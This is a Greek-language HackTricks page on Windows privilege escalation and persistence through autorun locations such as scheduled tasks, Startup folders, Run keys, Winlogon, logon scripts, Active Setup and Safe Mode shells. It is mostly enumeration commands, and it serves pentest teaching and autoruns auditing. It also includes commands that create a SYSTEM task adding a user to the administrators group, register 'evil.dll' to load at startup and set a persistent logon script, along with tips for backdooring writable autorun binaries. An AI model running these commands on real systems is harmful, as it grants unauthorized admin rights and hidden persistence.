# Escalation Privilege με Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

Το **Wmic** μπορεί να χρησιμοποιηθεί για την εκτέλεση προγραμμάτων κατά την **εκκίνηση**. Δείτε ποια binaries είναι προγραμματισμένα να εκτελούνται κατά την εκκίνηση με:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Προγραμματισμένες εργασίες

Οι **εργασίες** μπορούν να προγραμματιστούν ώστε να εκτελούνται με **συγκεκριμένη συχνότητα**. Χρησιμοποιήστε τις παρακάτω εντολές για να δείτε ποια binaries έχουν προγραμματιστεί να εκτελούνται:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Φάκελοι

Όλα τα binaries που βρίσκονται στους **φακέλους εκκίνησης** θα εκτελούνται κατά την εκκίνηση. Οι συνήθεις φάκελοι εκκίνησης είναι αυτοί που παρατίθενται παρακάτω, αλλά ο φάκελος εκκίνησης υποδεικνύεται στο registry. [Διαβάστε εδώ για να μάθετε πού.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **ΠΛΗΡΟΦΟΡΙΕΣ**: Οι ευπάθειες *path traversal* κατά την εξαγωγή αρχείων (όπως αυτή που εκμεταλλευόταν το WinRAR πριν από την έκδοση 7.13 – CVE-2025-8088) μπορούν να αξιοποιηθούν για την **τοποθέτηση payloads απευθείας μέσα σε αυτά τα Startup folders κατά την αποσυμπίεση**, με αποτέλεσμα την εκτέλεση κώδικα κατά την επόμενη σύνδεση χρήστη.  Για μια αναλυτική παρουσίαση αυτής της τεχνικής, δείτε:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Σημείωση από εδώ](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Η καταχώρηση **Wow6432Node** στο registry υποδεικνύει ότι εκτελείτε μια έκδοση 64-bit των Windows. Το λειτουργικό σύστημα χρησιμοποιεί αυτό το key για να εμφανίσει μια ξεχωριστή προβολή του HKEY_LOCAL_MACHINE\SOFTWARE για εφαρμογές 32-bit που εκτελούνται σε εκδόσεις 64-bit των Windows.

### Runs

**Συνήθως γνωστά** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Τα registry keys που είναι γνωστά ως **Run** και **RunOnce** έχουν σχεδιαστεί ώστε να εκτελούν αυτόματα προγράμματα κάθε φορά που ένας χρήστης συνδέεται στο σύστημα. Η γραμμή εντολών που αντιστοιχίζεται ως data value ενός key περιορίζεται στους 260 χαρακτήρες ή λιγότερο.<sup>[[2]](#references)</sup>

**Service runs** (μπορούν να ελέγχουν την αυτόματη εκκίνηση services κατά το boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Στα Windows Vista και σε μεταγενέστερες εκδόσεις, τα registry keys **Run** και **RunOnce** δεν δημιουργούνται αυτόματα. Οι καταχωρήσεις σε αυτά τα keys μπορούν είτε να εκκινούν απευθείας προγράμματα είτε να τα καθορίζουν ως dependencies. Για παράδειγμα, για τη φόρτωση ενός αρχείου DLL κατά τη σύνδεση, μπορεί να χρησιμοποιηθεί το registry key **RunOnceEx** μαζί με ένα key "Depend". Αυτό παρουσιάζεται με την προσθήκη μιας registry entry για την εκτέλεση του "C:\temp\evil.dll" κατά την εκκίνηση του συστήματος:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Αν μπορείτε να γράψετε σε οποιοδήποτε από τα αναφερόμενα registry στο **HKLM**, μπορείτε να κάνετε privilege escalation όταν συνδεθεί ένας διαφορετικός χρήστης.

> [!TIP]
> **Exploit 2**: Αν μπορείτε να αντικαταστήσετε οποιοδήποτε από τα binaries που υποδεικνύονται σε οποιοδήποτε registry στο **HKLM**, μπορείτε να τροποποιήσετε το συγκεκριμένο binary προσθέτοντας ένα backdoor όταν συνδεθεί ένας διαφορετικός χρήστης και να κάνετε privilege escalation.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Διαδρομή Startup

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Οι συντομεύσεις που τοποθετούνται στον φάκελο **Startup** ενεργοποιούν αυτόματα την εκκίνηση services ή εφαρμογών κατά το user logon ή την επανεκκίνηση του συστήματος. Η τοποθεσία του φακέλου **Startup** ορίζεται στο registry τόσο για το scope **Local Machine** όσο και για το scope **Current User**. Αυτό σημαίνει ότι οποιαδήποτε συντόμευση προστεθεί στις καθορισμένες τοποθεσίες **Startup** θα διασφαλίσει ότι το συνδεδεμένο service ή πρόγραμμα θα εκκινήσει μετά τη διαδικασία logon ή reboot, καθιστώντας το μια απλή μέθοδο προγραμματισμού της αυτόματης εκτέλεσης προγραμμάτων.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Αν μπορείτε να κάνετε overwrite οποιουδήποτε \[User] Shell Folder κάτω από το **HKLM**, θα μπορείτε να το δείξετε σε έναν φάκελο που ελέγχετε και να τοποθετήσετε ένα backdoor, το οποίο θα εκτελείται κάθε φορά που ένας user κάνει log in στο σύστημα, πραγματοποιώντας privilege escalation.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Αυτή η per-user τιμή μητρώου μπορεί να δείχνει σε ένα script ή command που εκτελείται όταν ο συγκεκριμένος user συνδέεται. Αποτελεί κυρίως primitive **persistence**, επειδή εκτελείται μόνο στο context του επηρεαζόμενου user, αλλά εξακολουθεί να αξίζει να ελέγχεται κατά τη διάρκεια post-exploitation και των ελέγχων autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Αν μπορείτε να γράψετε σε αυτή την τιμή για τον τρέχοντα user, μπορείτε να επανενεργοποιήσετε την εκτέλεση στο επόμενο interactive logon χωρίς να χρειάζεστε δικαιώματα admin. Αν μπορείτε να γράψετε στο hive ενός άλλου user, ενδέχεται να αποκτήσετε code execution όταν συνδεθεί αυτός ο user.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Σημειώσεις:

- Προτιμήστε πλήρεις διαδρομές προς αρχεία `.bat`, `.cmd`, `.ps1` ή άλλα launcher files που είναι ήδη αναγνώσιμα από τον χρήστη-στόχο.
- Αυτό παραμένει ενεργό μετά από logoff/reboot μέχρι να αφαιρεθεί η τιμή.
- Σε αντίθεση με το `HKLM\...\Run`, αυτό **δεν** παρέχει elevation από μόνο του· πρόκειται για persistence σε επίπεδο χρήστη.

### Κλειδιά Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Συνήθως, το κλειδί **Userinit** έχει οριστεί ως **userinit.exe**. Ωστόσο, αν τροποποιηθεί αυτό το κλειδί, το καθορισμένο executable θα εκκινηθεί επίσης από το **Winlogon** κατά το user logon. Παρομοίως, το κλειδί **Shell** προορίζεται να δείχνει στο **explorer.exe**, το οποίο είναι το default shell για τα Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Αν μπορείτε να αντικαταστήσετε την τιμή του registry ή το binary, θα μπορέσετε να κάνετε privilege escalation.

### Ρυθμίσεις πολιτικής

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Ελέγξτε το key **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Αλλαγή της γραμμής εντολών σε Safe Mode

Στο Windows Registry, στη διαδρομή `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, υπάρχει μια τιμή **`AlternateShell`**, η οποία από προεπιλογή έχει οριστεί σε `cmd.exe`. Αυτό σημαίνει ότι όταν επιλέγετε "Safe Mode with Command Prompt" κατά την εκκίνηση (πατώντας F8), χρησιμοποιείται το `cmd.exe`. Ωστόσο, είναι δυνατό να ρυθμίσετε τον υπολογιστή ώστε να εκκινεί αυτόματα σε αυτή τη λειτουργία, χωρίς να χρειάζεται να πατήσετε F8 και να την επιλέξετε χειροκίνητα.

Βήματα για τη δημιουργία μιας επιλογής εκκίνησης που ενεργοποιεί αυτόματα το "Safe Mode with Command Prompt":<sup>[[5]](#references)</sup>

1. Αλλάξτε τα attributes του αρχείου `boot.ini` ώστε να καταργήσετε τις σημαίες read-only, system και hidden: `attrib c:\boot.ini -r -s -h`
2. Ανοίξτε το `boot.ini` για επεξεργασία.
3. Εισαγάγετε μια γραμμή όπως: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Αποθηκεύστε τις αλλαγές στο `boot.ini`.
5. Επαναφέρετε τα αρχικά file attributes: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Η αλλαγή του **AlternateShell** registry key επιτρέπει τη ρύθμιση custom command shell, ενδεχομένως για μη εξουσιοδοτημένη πρόσβαση.
- **Exploit 2 (PATH Write Permissions):** Η ύπαρξη write permissions σε οποιοδήποτε τμήμα της μεταβλητής **PATH** του συστήματος, ειδικά πριν από το `C:\Windows\system32`, επιτρέπει την εκτέλεση ενός custom `cmd.exe`, το οποίο θα μπορούσε να λειτουργήσει ως backdoor αν το σύστημα εκκινούσε σε Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Η δυνατότητα εγγραφής στο `boot.ini` επιτρέπει την αυτόματη εκκίνηση σε Safe Mode, διευκολύνοντας τη μη εξουσιοδοτημένη πρόσβαση κατά την επόμενη επανεκκίνηση.

Για να ελέγξετε την τρέχουσα ρύθμιση **AlternateShell**, χρησιμοποιήστε τις παρακάτω εντολές:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Εγκατεστημένο Component

Το Active Setup είναι μια δυνατότητα των Windows που **ξεκινά πριν φορτωθεί πλήρως το desktop environment**. Δίνει προτεραιότητα στην εκτέλεση συγκεκριμένων εντολών, οι οποίες πρέπει να ολοκληρωθούν πριν συνεχιστεί το user logon. Αυτή η διαδικασία πραγματοποιείται ακόμη και πριν ενεργοποιηθούν άλλες startup entries, όπως εκείνες στις registry sections Run ή RunOnce.

Το Active Setup διαχειρίζεται μέσω των ακόλουθων registry keys:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Μέσα σε αυτά τα keys υπάρχουν διάφορα subkeys, καθένα από τα οποία αντιστοιχεί σε ένα συγκεκριμένο component. Οι βασικές τιμές που παρουσιάζουν ενδιαφέρον περιλαμβάνουν:

- **IsInstalled:**
- Το `0` υποδεικνύει ότι η εντολή του component δεν θα εκτελεστεί.
- Το `1` σημαίνει ότι η εντολή θα εκτελείται μία φορά για κάθε user, δηλαδή αυτή είναι η προεπιλεγμένη συμπεριφορά όταν απουσιάζει η τιμή `IsInstalled`.
- **StubPath:** Καθορίζει την εντολή που θα εκτελεστεί από το Active Setup. Μπορεί να είναι οποιαδήποτε έγκυρη command line, όπως η εκκίνηση του `notepad`.

**Security Insights:**

- Η τροποποίηση ή η εγγραφή σε ένα key όπου το **`IsInstalled`** έχει οριστεί σε `"1"` και υπάρχει συγκεκριμένο **`StubPath`** μπορεί να οδηγήσει σε μη εξουσιοδοτημένη εκτέλεση εντολών, πιθανώς για privilege escalation.
- Η τροποποίηση του binary file που αναφέρεται σε οποιαδήποτε τιμή **`StubPath`** μπορεί επίσης να επιτύχει privilege escalation, εφόσον υπάρχουν επαρκή permissions.

Για την επιθεώρηση των ρυθμίσεων **`StubPath`** σε όλα τα Active Setup components, μπορούν να χρησιμοποιηθούν οι ακόλουθες εντολές:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Επισκόπηση των Browser Helper Objects (BHOs)

Τα Browser Helper Objects (BHOs) είναι modules DLL που προσθέτουν επιπλέον λειτουργίες στον Internet Explorer της Microsoft. Φορτώνονται στον Internet Explorer και στον Windows Explorer κατά την εκκίνησή τους. Ωστόσο, η εκτέλεσή τους μπορεί να αποκλειστεί ορίζοντας το key **NoExplorer** σε 1, αποτρέποντας τη φόρτωσή τους μαζί με τα instances του Windows Explorer.<sup>[[1]](#references)</sup>

Τα BHOs είναι συμβατά με τα Windows 10 μέσω του Internet Explorer 11, αλλά δεν υποστηρίζονται από τον Microsoft Edge, το προεπιλεγμένο browser σε νεότερες εκδόσεις των Windows.

Για να εξετάσετε τα BHOs που είναι registered σε ένα σύστημα, μπορείτε να ελέγξετε τα ακόλουθα registry keys:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Κάθε BHO αναπαρίσταται στο registry από το **CLSID** του, το οποίο λειτουργεί ως μοναδικό identifier. Λεπτομερείς πληροφορίες για κάθε CLSID μπορούν να βρεθούν στο `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Για την αναζήτηση BHOs στο registry, μπορούν να χρησιμοποιηθούν οι ακόλουθες εντολές:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Extensions του Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Σημειώστε ότι το registry θα περιέχει 1 νέο registry για κάθε dll και θα αναπαρίσταται από το **CLSID**. Μπορείτε να βρείτε τις πληροφορίες του CLSID στο `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Drivers γραμματοσειρών

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Άνοιγμα εντολής

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Σημειώστε ότι όλες οι τοποθεσίες όπου μπορείτε να βρείτε autoruns έχουν **ήδη ελεγχθεί από το**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Ωστόσο, για μια **πληρέστερη λίστα αρχείων που εκτελούνται αυτόματα**, μπορείτε να χρησιμοποιήσετε το [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)από το systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Περισσότερα

**Βρείτε περισσότερα Autoruns όπως τα registries στο** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Συνήθεις μηχανισμοί persistence κακόβουλου λογισμικού](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot ή Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot ή Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Κατηγορίες Autostart (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Πώς μπορώ να προσθέσω μια boot option που εκκινεί ένα alternate shell;](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
